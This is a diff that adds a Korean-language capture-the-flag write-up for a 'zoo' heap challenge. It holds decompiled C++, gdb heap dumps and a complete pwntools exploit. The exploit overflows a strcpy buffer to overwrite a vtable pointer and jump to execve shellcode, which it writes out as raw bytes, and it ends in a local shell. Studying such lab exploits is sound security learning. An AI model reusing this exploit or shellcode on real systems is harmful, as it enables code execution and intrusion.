@@ -1264,3 +1264,331 @@ local....
 
 <br>
 
+# LAB 15
+
+```cpp
+int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  __int64 v3; // rax
+  int v4; // [rsp+4h] [rbp-Ch]
+  unsigned __int64 v5; // [rsp+8h] [rbp-8h]
+
+  v5 = __readfsqword(0x28u);
+  setvbuf(stdout, 0LL, 2, 0LL);
+  setvbuf(stdin, 0LL, 2, 0LL);
+  std::operator<<<std::char_traits<char>>(&std::cout, "Name of Your zoo :");
+  read(0, &nameofzoo, 0x64uLL);
+  while ( 1 )
+  {
+    menu();
+    std::operator<<<std::char_traits<char>>(&std::cout, "Your choice :");
+    std::istream::operator>>(&edata, &v4);
+    std::ostream::operator<<(&std::cout, &std::endl<char,std::char_traits<char>>);
+    switch ( v4 )
+    {
+      case 1:
+        adddog();
+        break;
+      case 2:
+        addcat();
+        break;
+      case 3:
+        listen();
+        break;
+      case 4:
+        showinfo();
+        break;
+      case 5:
+        remove();
+        break;
+      case 6:
+        _exit(0);
+        return;
+      default:
+        v3 = std::operator<<<std::char_traits<char>>(&std::cout, "Invaild choice");
+        std::ostream::operator<<(v3, &std::endl<char,std::char_traits<char>>);
+        break;
+    }
+  }
+}
+```
+
+오 씨피피다.. 
+
+```cpp
+unsigned __int64 adddog(void)
+{
+  __int64 v0; // rbx
+  unsigned int v2; // [rsp+Ch] [rbp-74h]
+  __int64 v3; // [rsp+10h] [rbp-70h]
+  __int64 v4; // [rsp+18h] [rbp-68h]
+  char v5; // [rsp+20h] [rbp-60h]
+  char v6; // [rsp+40h] [rbp-40h]
+  unsigned __int64 v7; // [rsp+68h] [rbp-18h]
+
+  v7 = __readfsqword(0x28u);
+  std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::basic_string(&v5);
+  std::operator<<<std::char_traits<char>>(&std::cout, "Name : ");
+  std::operator>><char,std::char_traits<char>,std::allocator<char>>(&edata, &v5);
+  std::operator<<<std::char_traits<char>>(&std::cout, "Weight : ");
+  std::istream::operator>>(&edata, &v2);
+  std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::basic_string(&v6, &v5);
+  v0 = operator new(0x28uLL);
+  Dog::Dog(v0, &v6, v2);
+  v4 = v0;
+  std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::~basic_string(&v6);
+  v3 = v4;
+  std::vector<Animal *,std::allocator<Animal *>>::push_back(&animallist, &v3);
+  std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::~basic_string(&v5);
+  return __readfsqword(0x28u) ^ v7;
+}
+```
+
+add_dog() 솔직히 잘 모르겠다.. cpp를 한번도 안해봤기 때문에.. 일단 malloc이 된다는 것은 알 수 있음(dog class로 객체 생성? 하는거 같다)
+
+```cpp
+unsigned __int64 listen(void)
+{
+  __int64 v0; // rax
+  unsigned __int64 v1; // rbx
+  __int64 v2; // rax
+  _QWORD *v3; // rax
+  unsigned int v5; // [rsp+4h] [rbp-1Ch]
+  unsigned __int64 v6; // [rsp+8h] [rbp-18h]
+
+  v6 = __readfsqword(0x28u);
+  if ( std::vector<Animal *,std::allocator<Animal *>>::size(&animallist) == 0 )
+  {
+    v0 = std::operator<<<std::char_traits<char>>(&std::cout, "no any animal!");
+    std::ostream::operator<<(v0, &std::endl<char,std::char_traits<char>>);
+  }
+  else
+  {
+    std::operator<<<std::char_traits<char>>(&std::cout, "index of animal : ");
+    std::istream::operator>>(&edata, &v5);
+    v1 = v5;
+    if ( v1 >= std::vector<Animal *,std::allocator<Animal *>>::size(&animallist) )
+    {
+      v2 = std::operator<<<std::char_traits<char>>(&std::cout, "out of bound !");
+      std::ostream::operator<<(v2, &std::endl<char,std::char_traits<char>>);
+    }
+    else
+    {
+      v3 = (_QWORD *)std::vector<Animal *,std::allocator<Animal *>>::operator[](&animallist, v5);
+      (**(void (__fastcall ***)(_QWORD))*v3)(*v3);
+    }
+  }
+  return __readfsqword(0x28u) ^ v6;
+}
+```
+
+listen()인데 주의깊게 봐야할 게 add, listen이다 일단 nx가 꺼져 있어서 쉘코드를 사용할 수 있는데 listen에서 무엇인가를 굉장한 포인터와 함께 실행해주기 때문에 아마 저게 익스 벡터겠지 하지만 능력 부족으로 아이다로 볼 수 없어 직접 코드로...
+
+```cpp
+class Dog : public Animal{
+	public :
+		Dog(string str,int w){
+			strcpy(name,str.c_str());
+			weight = w ;
+		}
+		virtual void speak(){
+			cout << "Wow ~ Wow ~ Wow ~" << endl ;
+		}
+		virtual void info(){
+			cout << "|---------------------|" << endl ;
+			cout << "| Animal info         |" << endl;
+			cout << "|---------------------|" << endl;
+			cout << "  Weight :" << this->weight << endl ;
+			cout << "  Name : " << this->name << endl ;
+			cout << "|---------------------|" << endl;
+		}
+};
+
+void listen(){
+	unsigned int idx ;
+	if(animallist.size() == 0){
+		cout << "no any animal!" << endl ;
+		return ;
+	}
+	cout << "index of animal : ";
+	cin >> idx ;
+	if(idx >= animallist.size()){
+		cout << "out of bound !" << endl;
+		return ;
+	}
+	animallist[idx]->speak();
+
+}
+
+아이다에서도 0000000000403140 off_403140      dq offset _ZN3Dog5speakEv 이렇게 확인할 수 있는데 아마 저게 맨 처음 포인터 일듯 하다.
+```
+
+이렇게 2개의 주요.. 코드를 보자 일단 virtual void speak()라는 걸로 보면 heap에 포인터가 생길거 같고 strcpy가 있기 때문에 어떻게든 악용가능할 것 같다. 
+
+```c
+addr                prev                size                 status              fd                bk
+0x1c08000           0x0                 0x11c10              Used                None              None
+0x1c19c10           0x0                 0x30                 Used                None              None
+0x1c19c40           0x10                0x20                 Freed                0x0              None
+0x1c19c60           0x0                 0x30                 Used                None              None
+0x1c19c90           0x20                0x20                 Used                None              None
+
+gdb-peda$ x/50gx 0x1c19c10
+0x1c19c10:	0x0000000000000000	0x0000000000000031
+0x1c19c20:	0x0000000000403140	0x0000000000000061
+0x1c19c30:	0x0000000000000000	0x0000000000000000
+0x1c19c40:	0x0000000000000010	0x0000000000000021
+0x1c19c50:	0x0000000000000000	0x0000000000000000
+0x1c19c60:	0x0000000000000000	0x0000000000000031
+0x1c19c70:	0x0000000000403140	0x0000000000000062
+0x1c19c80:	0x0000000000000000	0x0000000000000000
+0x1c19c90:	0x0000000000000020	0x0000000000000021
+0x1c19ca0:	0x0000000001c19c20	0x0000000001c19c70
+0x1c19cb0:	0x0000000000000000	0x0000000000020351
+
+0x605490 <animallist>:	0x0000000001c19ca0	0x0000000001c19cb0
+0x6054a0 <animallist+16>:	0x0000000001c19cb0	0x0000000000000000
+
+gdb-peda$ x/gx 0x0000000001c19ca0
+0x1c19ca0:	0x0000000001c19c20
+```
+
+개를 두마리 넣고나면 이렇게 할당이 되는데 저 맨위에 저녀석은 뭔지 모르겠고.. 왜 할당이 이렇게 되는지 저녀석은 free되어 있는지 모르겠다 ㅠㅠ 하지만 예상한대로 heap에 포인터들이 들어있다 그리고 speak()가 시작되는 동물리스트 전역변수에도 포인터가 박혀있는데 1c19ca0 -> 1c19c20 -> 0x403140 -> ~~ 이런식으로 굉장히 많은 포인터를 타고 들어간다. 그래서 아무리봐도 저 0x403140을 어떻게든 변조하면 될건데.. 할당할 때 값을 많이 넣어버리면 계속 죽거나 쭉 아래로만 덮여서 할 수가 없었다..
+
+```c
+gdb-peda$ x/50gx 0x1682c10
+0x1682c10:	0x0000000000000000	0x0000000000000031
+0x1682c20:	0x0000000000403140	0x0000000000000061
+0x1682c30:	0x0000000000000000	0x0000000000000000
+0x1682c40:	0x0000000000000010	0x0000000000000021
+0x1682c50:	0x0000000000000000	0x0000000000000000
+0x1682c60:	0x0000000000000000	0x0000000000000031
+0x1682c70:	0x0000000000403140	0x6363636363636363
+0x1682c80:	0x6363636363636363	0x6363636363636363
+0x1682c90:	0x6363636300000030	0x6363636363636363
+0x1682ca0:	0x6363636363636363	0x0000000001682c70
+0x1682cb0:	0x6363636363636363	0x6363636363636363
+0x1682cc0:	0x6363636363636363	0x6363636363636363
+0x1682cd0:	0x6363636363636363	0x6363630063636363
+0x1682ce0:	0x6363636363636363	0x6363636363636363
+0x1682cf0:	0x6363636363636363	0x0000000063636363
+
+Dog(string str,int w){
+    strcpy(name,str.c_str());
+    weight = w ;
+}
+```
+
+많은 짓 중에 1 chunk free하고 재할당 할 때 많이 넣어봤더니 이런식으로 덮여지는 걸 겨우 발견했다 아마 위의 strcpy 때문 아닐까!
+
+근데 저 아래 포인터 0x6363636363636363	0x0000000001682c70 이녀석을 변조하려고 했었는데 아니 c가 들어가면 안죽는데 저 쪽에 namezoo 전역변수를 쓰면 계속 죽어버렸다.. (왤까...)
+
+```c
+gdb-peda$ x/50gx 0x13d7c10
+0x13d7c10:	0x0000000000000000	0x0000000000000031
+0x13d7c20:	0x0000000000403140	0x6363636363636363
+0x13d7c30:	0x6363636363636363	0x6363636363636363
+0x13d7c40:	0x6363636300000030	0x6363636363636363
+0x13d7c50:	0x6363636363636363	0x6363636363636363
+0x13d7c60:	0x6363636363636363	0x6363636363636363
+0x13d7c70:	0x6363636363636363	0x6363636363636363
+0x13d7c80:	0x6363636363636363	0x0000000063636363
+0x13d7c90:	0x0000000000000020	0x0000000000000021
+0x13d7ca0:	0x00000000013d7c70	0x00000000013d7c20
+```
+
+캬 0 chunk free -> malloc() input c*100
+
+```cpp
+std::operator<<<std::char_traits<char>>(&std::cout, "Name of Your zoo :");
+read(0, &nameofzoo, 0x64uLL);
+```
+
+아주 좋은 전역변수가 존재한다! 
+
+```python
+from pwn import * 
+
+t = process('./zoo')
+
+r = lambda w: t.recvuntil(str(w))
+s = lambda z: t.sendline(str(z))
+
+def dog(a,b):
+	r(":")
+	s("1")
+	r(":")
+	s(str(a))
+	r(":")
+	s(str(b))
+
+def lis(a):
+	r(":")
+	s("3")
+	r(":")
+	s(str(a))
+
+def show(a):
+	r(":")
+	s("4")
+	r(":")
+	s(str(a))
+
+def d(a):
+	r(":")
+	s("5")
+	r(":")
+	s(str(a))
+
+sc = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
+zoo = 0x0000000000605420
+
+r(":")
+s(sc + p64(zoo))
+
+dog("a",0x10)
+dog("b",0x20)
+d(0)
+dog("c"*72 + p64(zoo + len(sc)),0x30)
+lis(0)
+t.interactive()
+```
+
+실행해보면
+
+```c
+0x1d21c10:	0x0000000000000000	0x0000000000000031
+0x1d21c20:	0x0000000000403140	0x6363636363636363
+0x1d21c30:	0x6363636363636363	0x6363636363636363
+0x1d21c40:	0x6363636300000030	0x6363636363636363
+0x1d21c50:	0x6363636363636363	0x6363636363636363
+0x1d21c60:	0x6363636363636363	0x6363636363636363
+0x1d21c70:	0x000000000060543b	0x0000000000000062
+0x1d21c80:	0x0000000000000000	0x0000000000000000
+0x1d21c90:	0x0000000000000020	0x0000000000000021
+0x1d21ca0:	0x0000000001d21c70	0x0000000001d21c20
+
+0x605490 <animallist> : 0x1d21ca0 -> 0x1d21c70 -> 0x60543b -> 0x605420 -> 0x605420 <nameofzoo>:	0x91969dd1bb48c031	0x53dbf748ff978cd0
+			 0xb05e545752995f54	 0x0000605420050f3b
+
+   0x4018a2 <listen()+182>:	mov    rdx,QWORD PTR [rax]
+   0x4018a5 <listen()+185>:	mov    rdx,QWORD PTR [rdx]
+   0x4018a8 <listen()+188>:	mov    rdi,rax
+=> 0x4018ab <listen()+191>:	call   rdx
+   0x4018ad <listen()+193>:	mov    rax,QWORD PTR [rbp-0x18]
+   0x4018b1 <listen()+197>:	xor    rax,QWORD PTR fs:0x28
+   0x4018ba <listen()+206>:	je     0x4018c1 <listen()+213>
+   0x4018bc <listen()+208>:	call   0x4010d0 <__stack_chk_fail@plt>
+Guessed arguments:
+arg[0]: 0x2561c70 --> 0x60543b --> 0x605420 --> 0x91969dd1bb48c031
+```
+
+하앟 이렇게 셀코드에 접근..할 수 있다!
+
+```c
+$ id
+uid=1000(bskim)
+```
+
+add_dog를 전혀 알 수가 없으니... 풀긴 풀었는데 푼거 같지않다.. cpp 좀 공부해야겠다..
+
